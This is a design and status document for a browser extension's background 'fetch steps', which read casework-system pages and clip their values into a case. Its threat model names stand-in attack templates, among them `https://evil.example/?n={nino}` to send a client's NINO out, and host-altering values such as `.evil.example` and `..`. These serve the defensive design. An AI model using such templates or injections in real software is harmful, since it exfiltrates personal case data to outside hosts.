# Fetch steps: pages read in the background, nested under a step

Created: 2026-11-25. Status: phase 1 built (2026-11-25), with the *Read pages in the background* switch; list requests (every link in a list on the trigger page, results as rows, `show` and markers) built 2026-11-26, see [system-homepages-and-inbox-triage.md](system-homepages-and-inbox-triage.md); phases 2 and 3 not started. Needs the site rules in `site-access-lists.md` first: every request here is one of its actions, `fetch-get` or `fetch-post`.

**What's built (phase 1).** The `fetch` role in `lib/journey.js` (`fetchTemplateErrors()`, `fillFetchUrl()`, `fetchStepErrors()` in `validateSteps()`, `stepForPage()`, `stepStatus()`, `stepAddress()`), `lib/library.js` `fetchIndexErrors()`, and in `lib/flows.js` the requests (`addRequest()`, `setRequest()`, `removeRequest()`, `setThen()`, `requestPreview()`), compiling, export and import, `validateFlow()`'s rows and `startable()`'s list of fetch steps. The runner is `lib/fetch-steps.js` (`planRun()`, `runFetchStep()`, `responseProblem()`, `readResponse()`, `applyFetched()`), with the request sent by `lib/core.js` `fetchFromTab()`. The Case tab's card is `sidebar/fetch-ui.js`; the editor, with *Test as fetched* and the request preview, is in `sidebar/flows.js`. `fetch_page` is in `lib/activity.js`. Tests: `tests/js/fetch-steps.test.js`, `fetch-run.test.js`, `fetch-sidebar.test.js` and `background-reading.test.js`.

**Read pages in the background.** Added after this plan was written, at the user's request: one switch, *Read pages in the background (pages you're not on)*, covering fetching and clipping pages the caseworker isn't on. It's on by default (`BACKGROUND_READING_DEFAULT` in `lib/access.js`, one constant, for the owner to change). Policy `siteAccess.backgroundReading` (`true` or `false`) sets and locks it. The library's `access.json` sets it with `"backgroundReading": { "on": false, "lock": true }`, locked or left to the caseworker (and `siteAccess.lockLibraryRules` locks it too). Otherwise it's the caseworker's, in **Settings → Sites Power Loader works on**. Off is a deny of `fetch-get` and `fetch-post` that `accessLayers()` adds to the layer of whoever turned it off, so the rule engine is the one place that enforces it: fetch steps don't run, *Test as fetched* doesn't fetch, the step says in plain words who turned it off and that the caseworker can open each page and clip it themselves (with a button for each), and `validateFlow()` gives a warning, not an error. It isn't listed as a site rule, and it doesn't count as one for `<all_urls>` or for partly blocked origins. This replaces the `fetchSteps.enabled` key that *Phasing* proposed.

**How the open questions were settled for phase 1.**

- *B or C.* B, as recommended: the request is made in the trigger tab's content-script world. It's isolated in `lib/core.js`: `FETCH_WORLD = 'ISOLATED'` and `fetchFromTab()`, which runs the packaged `fetchInPage()` with `scripting.executeScript`. If the Firefox suite shows a content-script fetch doesn't carry the session in Firefox 140 ESR, set `FETCH_WORLD = 'MAIN'` (way C); nothing else changes, because the response comes back as bytes and is parsed in the sidebar either way. **Unverified:** only real Firefox can settle it.
- *Way A.* Not built: phase 1 fetches only from the trigger page's own site.
- *`fetchSteps.enabled` default.* Replaced by the background-reading switch above, on by default.
- *Review before adding.* Not by default, as recommended: values are added like a normal clip, and the card shows what each request added, with *Open the page* and *Undo*. `review: true` stays phase 2.
- *JSON.* `json-clips.md`. The runner reads a response by its profile's `format` through `FORMATS` in `lib/fetch-steps.js`: phase 1 has only `html`; `json` plugs in there with its own Accept header, content types and reader. The page-side function returns status, Content-Type and bytes, never a parsed page.
- *`then.open: 'auto'`.* Not allowed in phase 1: `validateSteps()` refuses it, so the next page always needs a click.
- *Casework systems' access logs and the DPIA.* Not something code settles; the Settings text tells the caseworker the system logs fetched pages as opened by them.

**Differences from the text below, and small choices.** The trigger is the step's own `url` and `match`, as for a page to visit, rather than `fetch.trigger`. `validateSteps()` accepts only `GET` (and no `body`) until POST is built, so a POST request is refused rather than checked against `fetch-post`. A value that is only dots is refused wherever it goes in the address. *Test as fetched* needs the tab on the request's own site (any page of it, not only the trigger page), and keeps only `tested.fetched: { at, ok, snapshot }`, never the samples or values; a refusal (a redirect, a sign-in, an error) isn't kept as a verdict, only a read that passes or fails. HTML is decoded with the Content-Type's charset (UTF-8 when none); a `<meta charset>` isn't sniffed. A fetched page is checked against the profile's `when` before it's read. The step is done when every required request's profile has a clip in the case, or all of them when none is required.

**Deferred.** Phase 2 and 3 as below: `then.open: 'auto'`, `review: true`, *More rules* for action-specific rules in Settings, other origins (way A), background tabs and POST. The Firefox suite (`tests/firefox`) for this plan isn't written: it needs real Firefox and demo pages behind a session cookie. `REVIEWERS.md` has the reviewer paragraph; `docs/releasing.md`'s reviewer notes should copy it at the next submission.

## Why

Some evidence sits on pages the caseworker has no reason to open. For example, the caseworker goes to the *Start case* screen. Power Loader fetches the client's details, their tenancy and their payment history, reads each with its page profile, and then takes the caseworker to the *Decision* screen. Today each of those is a page to clip: the caseworker opens it, clips it and moves on. A **fetch step** does the opening and clipping for them, on one click. The values still go into the case as clips, so conflicts, the identity check and the fill plan work as they do now.

## The step

### What a fetch step is

A new step role, `fetch` (*Pages to fetch*). It's a parent step with child requests:

```text
Page (role 'fetch') { id, name, step: { text, links },
                      fetch: { trigger: { match } | null,
                               requests: [Request],
                               then: { to?, url?, open: 'ask' | 'auto' } } }
Request { id, name, url,          a template: {ref}, {fieldKey}, encoded, host fixed
          method: 'GET' | 'POST', GET unless allowed (see Posting)
          body?,                  POST only: { name: template }, sent as a form
          pageId,                 the page to clip whose profile reads the response
          required: boolean }     a required request that fails leaves the step not done
```

- **The trigger** is the page the step belongs to. It's a match pattern like a guide page's (`p.match`), set with *Use the current page* in the editor. `stepForPage()` in `lib/journey.js` finds the step by it, so the Steps card shows it when the caseworker is on that page. A step with no trigger is shown in order like any other step.
- **Each request's page** is an ordinary page to clip (`role: 'input'`) with `parent: <fetch step id>`. Its profile, picks, tests and leak checks are those of any page to clip (`lib/drafts.js`). It isn't a step of its own: `journeyOf()` leaves out pages with a `parent`. It still counts in the contract, so `gatheredBy()` sees its fields as gathered.
- **Then** is where the caseworker goes next: another page of the flow (`to`) or a template address, as for links. With `open: 'ask'` (the default) the card shows *Go to Decision*. With `'auto'` it opens once every required request has been read, no identity warning is waiting and the address is allowed for `navigate`.

### When it runs

Only when the caseworker presses **Fetch 3 pages** on the step. The step is shown when they reach the trigger page, but it never fetches on arrival in the first version. One press is one run, visible, cancellable and logged. Fetching automatically on arrival is a possible later option, like auto-clip: off by default, with a Settings switch and a policy key.

The button needs the trigger page in the current tab (*Go to Start case first*), because requests are made from that page (see *How it fetches*). It's disabled, with the reason, when:

- a request needs a value the case hasn't got: the existing *A link needs…* inputs are used;
- a request's address is blocked by the site rules;
- the site rules or policy turn fetch steps off.

### Templates

Request addresses use the link templating in `lib/journey.js`: `fillTemplate()` with `caseVars()`, which gives only the case reference and settled, valid values, each `encodeURIComponent`-ed. Fetching adds rules that links don't have yet (`site-access-lists.md` proposes them for links too):

- **The scheme, host and port are literal.** `fetchTemplateErrors()` refuses any `{name}` before the first `/` after `//`, and a `{name}` straight after the host (`https://cm.example{x}/`, where `x = .evil.example` would change the host). Today `templateErrors()` replaces each `{name}` with `x` before checking, so it would pass both.
- **A value can't be a dot segment.** `encodeURIComponent('..')` is `..`, and the URL parser treats `..` and `%2e%2e` as "up one folder". A value that is only dots is refused for a fetch.
- **The filled address must still fit.** After `fillTemplate()` it is parsed with `new URL()`. Its origin must be the template's literal origin, and it must match its page's profile `match` (`matchUrl()`). So a request can only fetch a page its profile is for. That's also how a fetched page is matched to its profile: by construction, then checked.
- The host must be on the case's approved hosts and allowed for `fetch-get` (or `fetch-post`) by every site-rule layer. In the first version it must also be the trigger page's origin.

### In steps.json and the flow file

`compileSteps()` in `lib/flows.js` writes:

```json
{ "id": "p-start", "name": "Start case", "role": "fetch", "text": "…", "links": [],
  "match": ["https://cm.example.gov.uk/cases/*/start"],
  "fetch": { "requests": [{ "id": "r1", "name": "Client details", "url": "https://cm.example.gov.uk/clients/{clientId}",
                            "method": "GET", "profileId": "cm/client-details", "required": true }],
             "then": { "url": "https://cm.example.gov.uk/cases/{ref}/decision", "open": "ask" } } }
```

- `STEP_ROLES` gains `fetch`. `validateSteps()` checks requests (an id, a name, a method of GET or POST, `fetchTemplateErrors()`, a body only with POST, at most 6 requests) and `then`.
- `indexLibrary()` checks that each `profileId` is in the library, and that each request host is approved (as it does for `match` hosts now). Children compile to `profiles/pages/…` like any page to clip.
- `ROLES` gains `fetch: 'Pages to fetch'` and `ROLE_ORDER` places it with guide pages. `newPage('fetch')` starts with `fetch: { trigger: null, requests: [], then: { open: 'ask' } }`.
- `pageExtras()` keeps `fetch` and `parent` through export, with lengths capped as for `email` and `scan`. `importFlow()` maps request `pageId`s and `then.to` to the new page ids, as it does for links, and drops a request whose page is missing. Imported pages come back untested, as now, so a fetch step from a file can't run until its pages are tested here.
- `stepStatus()`: a fetch step is `done` once every required request's profile has a clip in the case, or when it's marked done. `stepAddress()` gives the trigger page's address.

### Validation

New rows for `validateFlow()`:

| Problem | Level | Fixes |
|---|---|---|
| A fetch step with no requests | error | add one |
| A request with no page, or a page that isn't made yet | error | make its page |
| A request address that puts a value in the host, isn't on an approved host, or doesn't match its page's profile | error | edit the address |
| A request's page hasn't been tested as fetched | error | *Test as fetched* |
| A POST request where no site rule allows `fetch-post` | error | ask IT or the library team, or use GET |
| The site rules block a request address | error (`blocked`, `site-access-lists.md`) | as the rule says |
| A fetch step with no trigger page | warning | none needed: it's shown in order |
| More than 6 requests | error | split the step |

### Authoring: the profile for a page the caseworker never sees

The author can see the page even though the caseworker won't. A request's page is made like any page to clip, with one more test.

1. **Add a fetch step**, open it on the trigger page and choose **Use the current page**.
2. **Add a request.** Name it, then go to the page it reads in this tab (*Go to it*) and choose **Use the current page**. That binds a child page to clip, as `bindPage()` does now, and suggests the request address from `suggestPatterns()`'s link pattern (`/clients/{ref}` becomes `/clients/{clientId}` once the author picks the field). The author makes the profile with the usual tools: ✦ or by hand.
3. **Test on the page**, as now (`runTest()`).
4. **Test as fetched.** The editor asks for a sample value for each `{name}` in the address. It's kept in memory only (`flowUi`), never saved or exported, and the record open in the tab is fine. Power Loader then fetches the address exactly as a case would (*How it fetches*) and runs the profile on the response, not the live tab. Results show per field, as the live test does. `recordTest()` keeps `tested.fetched: { at, ok }`. A page that passes in the tab but fails as fetched usually builds its content with JavaScript, and the editor says so: *This page is built after it loads, so it can't be fetched. Make it a page to clip instead.*
5. **The request preview.** The step's overview lists each request as it will be sent: method, the address with its fixed host shown plainly and each `{name}` named (*Client ID, from the case*), the profile, and *Sends: Client ID in the address*. The export file's `problems` and `hosts` include them, so the maintainer reviewing the flow sees every request.

## How it fetches

| Way | Session and cookies | JavaScript pages | Redirects and sign-in | Cost | Verdict |
|---|---|---|---|---|---|
| A. `fetch()` from the sidebar or background, with host permission and `credentials: 'include'` | Should send the site's cookies, but `magic-reader.md` notes it "may miss session cookies under Total Cookie Protection". It uses the default container, not the tab's. SameSite cookies are unverified. | No | `redirect: 'manual'` works | Cheap | Later, for other origins, if the Firefox suite shows it gets the session |
| B. `fetch()` in the content script, in the trigger tab | Unverified: Firefox MV3 content-script fetches may not carry the page's origin and cookies (`magic-reader.md`, path 2) | No | As A | Cheap | Preferred for phase 1 **if** it carries the session |
| C. `scripting.executeScript({ world: 'MAIN' })` in the trigger tab, running `fetch()` as the page | The page's own: same origin, its cookies, its container, its SameSite context | No | `redirect: 'manual'` gives an opaque redirect | Cheap | Phase 1 if B doesn't carry the session |
| D. A background tab (`tabs.create({ active: false, cookieStoreId })`), read with the agent once loaded | The tab's own | Yes | Followed like browsing; the tab shows them | Slow and visible; adds history entries; hiding it needs `tabHide` | Phase 3, only for pages that need it |

**Decided:** phase 1 fetches from the trigger tab, as the page, same origin only, and parses the response with `DOMParser`. That's B, or C if the Firefox suite shows B doesn't carry the session. Both send the request as the casework system's own page would, so the session, containers and SameSite cookies behave as the caseworker expects. CORS limits them to the trigger page's origin, which is a useful bound. Neither needs a new permission.

C runs Power Loader's packaged function in the page's own world, where the page's scripts could replace `window.fetch`. The response is still only evidence, checked like any clip. But that's a reason to prefer B where it works. The function is a fixed function in the extension, passed to `executeScript`. It isn't code from the library or a string.

### What a run does

For each request, in order, at most 4 at a time (2 before list requests):

1. Fill the address (*Templates*). Check `allowed(url, 'fetch-get')` (`site-access-lists.md`) and that the tab's address still matches the trigger.
2. Fetch with `method: 'GET'`, `credentials: 'same-origin'`, `redirect: 'manual'`, `cache: 'no-store'` and an `AbortSignal` with a 20-second timeout.
3. **Any redirect fails the request**: *Client details moved to another address, probably a sign-in page. Open it in a tab, sign in, then try again.* Following redirects would let a request end up somewhere the check didn't cover. A same-origin redirect (`/clients/1` to `/clients/1/`) also fails, and the author sees it in *Test as fetched* and corrects the address. If redirects are ever followed, `response.url` is checked against the rules, the origin and the profile's `match` before anything is read.
4. A 401 or 403 is *You may need to sign in again*. Any other status that isn't 2xx is *The page returned an error ({status})*. A response that isn't `text/html`, or is over 2 MB, is refused.
5. Parse with `DOMParser`, check the profile's `when` (`profileApplies()` with the response's address), then `extract()` with `baseUrl` set to the response's address. `extract()` uses no layout APIs (I found no `innerText` or `getComputedStyle` in `lib/extract.js`), so it runs on a parsed document. Elements the page hides with CSS are still read, and the *Test as fetched* step shows that.
6. Make the clip with `clipFromExtract(lib, profile, { data, url, title })` and add it with `addClip()` inside `updateCase()`. `kind` is `'fetch'`. The source is `${profile.id}|${url}`, the same as clipping that page, so fetching again (or clipping it by hand) replaces the clip instead of duplicating it.

**Limits.** At most 6 requests a step (plus one list of at most 25 links) and 60 a case in 10 minutes, so a mistaken flow can't hammer a system. (The caps were 30 a case and 2 at a time until list requests; see `FETCH_LIMITS`.) There are no automatic retries: *Try again* is per request. A run's total time is at most 60 seconds.

**Cancelling.** *Stop* aborts the run's `AbortController`. Teardown's `CASE_ENDED` message (`lib/teardown.js`, step 1) aborts it too, and the sidebar's `resetCaseViews()` cancels it like OCR and scans. A late response hits `updateCase()`, which throws `CaseEnded` and drops it, as for every other late result. Navigating the trigger tab away ends the page's fetches with it. A run reports what it got before it stopped.

### Provenance and the identity check

A fetched clip is a page clip with `kind: 'fetch'` and `via: { stepId, requestId }`:

- its address is the one checked and read, and its title is the parsed document's;
- the clip list shows it as *Client details · fetched by Start case*, with **Open the page**, which opens its address in a tab (a `navigate` check);
- page clips carry no per-value quotes today (only the reader's clips do). Fetched clips match page clips. Adding quotes to both, from the text of each matched element, is a separate change.

`addClip()` runs the identity check unchanged. The address was filled from the case's own values, so the page should be the case's. If its name, date of birth, NINO or client ID disagree, *This may be a different person* comes first, as for any clip, and `then.open: 'auto'` doesn't open the next page.

### Added, or reviewed first?

Fetched values are **added like a normal clip**: the profile has passed its tests, and clipping a page doesn't ask for review either. The caseworker didn't see the page, though, so the step card shows what each request added: *3 values added, 1 conflict*, the identity warning if any, **Open the page** and **Undo** (the existing `openRemoveClip()`). A request can set `review: true` in phase 2 to use the reader's pattern instead (`addToCase()` in `sidebar/tools/reader-ui.js`): each value with its status (*New*, *Matches case*, *Differs from …*) and a tick, re-validated on add.

### The Steps card

`stepsCard()` in `sidebar/caseview.js` shows a fetch step's requests as a list under its text, each with its state: *Waiting*, a spinner, *✓ 4 values*, *✕ Sign in again*, or *Blocked by the site rules*. Below are **Fetch 3 pages**, then *Stop* while running, and **Go to Decision** once done. *All steps* shows the step with the same icons as other steps (`STEP_ICON`). The live region announces *Fetched 3 pages: 9 values added, 1 conflict.*

## Security and privacy

### Every request goes through the site rules

Each request is checked with `allowed(url, 'fetch-get')` or `allowed(url, 'fetch-post')` from `site-access-lists.md`, across every layer: policy, the library's locked rules, the caseworker's rules and the case's approved hosts. It is checked when the run starts and again for the filled address just before each request. Redirects aren't followed (*What a run does*, step 3). The library governs fetching in its `access.json` with the same shape, locked or delegated. For example, it can lock a block on posting to a decision screen:

```json
{ "id": "no-post-decide", "effect": "deny", "pattern": "https://cm.example.gov.uk/cases/*/decide*", "actions": ["fetch-post"], "lock": true }
```

or allow GET from only one system:

```json
{ "id": "get-cm", "effect": "allow", "pattern": "https://cm.example.gov.uk/*", "actions": ["fetch-get"], "lock": true }
```

A flow file carries no rules, so a fetch step in an imported flow can only use what the site rules and approved hosts already allow.

### Posting

- `fetch-post` is a closed action: nothing is allowed until an allow rule naming it matches the address, from policy, the library's `access.json`, or the caseworker's own rules. A flow can't open it, and a plain allow without `actions` doesn't.
- A POST is never automatic. Before each run that includes one, the caseworker sees a confirmation, like the fill plan: the address, each form field's name and the value it will send, and *Power Loader will send this to {host}. Only continue if it looks up information and changes nothing.*
- The body is `application/x-www-form-urlencoded`, built from `body: { name: template }` with literal names and values from `fillText()`, then encoded. There's no JSON body and no headers from the template.
- Many casework systems need a CSRF token, read from a form first. Supporting that means fetching the form, reading the token with the profile, and posting. That is close to submitting a form, which Power Loader never does (`release-plan.md`, *Filling*). So POST is designed here but not built until a real case needs it (phase 3).

### Logging, without values

New activities in `lib/activity.js`:

- `fetch_page: 'Fetch page'`, one per request: `page_type` is `${profile.id}@${version}` and `url_pattern` is the profile's `urlPattern` (`pageLogInfo()`), never the filled address. `detail` is the step's and the request's names, the item count, or the failure (*sign-in*, *timeout*, *error 500*, *blocked*). The clip id is kept as for `clip_page`, so removing the clip can purge it.
- `blocked_action` (from `site-access-lists.md`) for a request the rules refuse.
- `complete_step` when the step is done.

The live address is passed as `page.url` only for the open case, as for clipping, and `archiveLog()` drops it at the end.

### What a mistaken or poisoned library or flow could do

| Risk | Mitigation |
|---|---|
| Send case values to another site (`https://evil.example/?n={nino}`) | Host fixed in the template; approved hosts; site rules; same origin as the trigger page in phase 1; filled address must match the page's profile |
| Change the host with a value (`https://{x}/`, `https://cm.example{x}/`, `..`) | `fetchTemplateErrors()`; origin checked after filling; dot segments refused |
| Change something through a GET that does more than show a page (`/cases/1/close`) | Each request must match a page-to-clip profile, which the author tested on that page. The author's preview and the maintainer's review list every request. The caseworker sees the requests on the step before pressing. Libraries can lock `fetch-get` to known pages. |
| POST to change a record | `fetch-post` closed by default; confirmation of every POST; not built until needed |
| Read many records, or hammer a system | 6 requests a step and one list of at most 25, 60 a case in 10 minutes, at most 4 at a time; button only |
| Read a page about someone else | Addresses filled only from the case's settled values; the identity check on every clip |
| An imported flow with fetch steps | No rules in flow files; pages untested until tested here; the start confirmation lists fetch steps and their hosts with the untested pages (`startable()`) |

Background fetches are still the caseworker's requests to the casework system. The system logs them under the caseworker's account as if they had opened each page. The DPIA and the staff guidance need to say so (`case-activity-log.md`).

### AMO review

- No new permissions in phases 1 and 2: `scripting` and `tabs` are already held, and origins stay optional. A background tab in phase 3 would avoid `tabHide` by leaving the tab visible.
- No remotely hosted code: templates and profiles are data, as now. The fetch function is packaged and passed to `executeScript`.
- `data_collection_permissions` already declare `websiteContent`.
- `REVIEWERS.md` and the reviewer notes (`docs/releasing.md`) need a paragraph: *When the caseworker presses a fetch step's button, Power Loader requests the pages the library names from the same casework site the tab is on, using GET, reads them with the library's page profiles and adds the values to the case on this computer. Nothing is sent anywhere else. Requests are limited by the site rules, the library's approved hosts and fixed caps.*

## How it reuses what exists

| Existing | Used for |
|---|---|
| `lib/extract.js` `extract()`, `profileApplies()`, `matchUrl()` | Reading a parsed response, checking `when`, matching the address to its profile |
| Pages to clip, drafts, picks, tests, leak checks (`lib/drafts.js`, `sidebar/flows.js`) | Making each request's profile, plus *Test as fetched* |
| `fillTemplate()`, `caseVars()`, the missing-value inputs (`lib/journey.js`, `caseview.js`) | Request addresses, plus `fetchTemplateErrors()` |
| `clipFromExtract()`, `addClip()`, `updateCase()` (`lib/case.js`, `lib/core.js`) | Clips, conflicts, the identity check, dropping late results |
| `stepStatus()`, `currentStep()`, `stepsCard()` | The step's state and its card |
| The reader's review before adding (`reader-ui.js`) | `review: true` requests, phase 2 |
| `allowed()` from `site-access-lists.md` | Every request, with `fetch-get` or `fetch-post` |
| `CASE_ENDED`, `resetCaseViews()` | Cancelling a run |
| `library-sync.js` `get()` | The precedent for strict fetching: `redirect: 'error'`, a host check on `res.url`, a size cap |

Flow annotations (notes a step writes into a page) are governed by the same rules through the `annotate` action, and never apply to fetched pages, which aren't shown.

## Phasing

1. **GET from the trigger page.** Phase 0 is the site rules (`site-access-lists.md`), with `fetch-get` and `fetch-post` in the engine. Then: the `fetch` role, requests with GET only, the same origin as the trigger page, the button, static HTML, redirects refused, values added like a clip. Authoring with *Test as fetched* and the request preview. Compile, validate, export and import. Logging. ~~Policy key `fetchSteps.enabled`~~ Built instead as *Read pages in the background*: policy `siteAccess.backgroundReading`, the library's `access.json` `backgroundReading`, or the caseworker's Settings, on by default (see the status above).
2. **Comfort.** `then.open: 'auto'`, `review: true`, action-specific rules under *More rules* in Settings, and fetching from other approved origins with way A, if the Firefox suite shows it gets the session.
3. **Harder pages.** A background tab for pages built with JavaScript (`render: true` on a request). POST with confirmation, if a real case needs it.

## Tests

Offline (jsdom, `tests/js`):

- `fetchTemplateErrors()`: a value in the host, straight after the host, in the port; dot segments; an address that doesn't match its profile after filling; a different origin.
- `compileSteps()`, `validateSteps()`, `indexLibrary()` and `importFlow()` for fetch steps: ids remapped, a missing page dropped, imported pages untested, an unknown `profileId` refused, an unapproved host refused.
- `journeyOf()` leaves out child pages; `gatheredBy()` counts them; `stepStatus()` for required and optional requests.
- The runner, with a fake page `fetch`: redirect refused; 401 reported as sign-in; non-HTML and oversized responses refused; timeout; *Stop*; `CASE_ENDED` aborts and a late result is dropped; the caps; a blocked address never requested; a rules change between the start and a request respected.
- Clips: `kind: 'fetch'`, the same source as clipping the page (so it replaces), the identity warning, `fetch_page` logged with the pattern, never the address or a value.
- POST (phase 3): refused without an allow rule naming `fetch-post`; refused when only a flow asks for it; confirmation required.

Firefox (`tests/firefox`), against new demo pages: a *Start case* page and three evidence pages that need a session cookie set by the demo server:

- Fetching from the trigger tab sends the session; without it, the result is *Sign in again*. This decides between B and C.
- An evidence page that redirects to `/login` fails without following.
- The same run under a container tab (`cookieStoreId`).
- Teardown during a run: no clip and no log event after it ends.
- *Test as fetched* on a page built by JavaScript reports it.

## What's decided

- A `fetch` step is a parent with child requests; each child is a page to clip with a `parent`, so profiles, tests and the contract are reused.
- Button only, from the trigger page, GET only, same origin, no redirects, in phase 1.
- The host is never templated; the filled address must match its profile; every request passes `allowed()` with `fetch-get` or `fetch-post`.
- Fetched values are clips (`kind: 'fetch'`), added like a normal clip, with the identity check unchanged.
- POST is closed by default, confirmed every time, and not built until needed.
- The library governs fetching with the same `access.json` rules as `site-access-lists.md`, locked or delegated. Flows carry no rules.

## What's open

- Whether a content-script `fetch()` (B) carries the page's session in Firefox 140 ESR, or whether page-world fetching (C) is needed. The Firefox suite answers this.
- Whether way A gets session cookies under Total Cookie Protection, which would allow requests to other approved systems.
- ~~Whether `fetchSteps.enabled` should default to on once the feature has been used.~~ Settled: the background-reading switch, on by default (one constant).
- Whether fetched values should be reviewed before they're added by default, since the caseworker never saw the page.
- Whether pages that load their data as JSON should be readable, with a JSON form of the profile DSL.
- How the casework systems' own access logs treat background requests, and what the DPIA says about them.
- Whether `then.open: 'auto'` should be allowed at all, or always need a click.
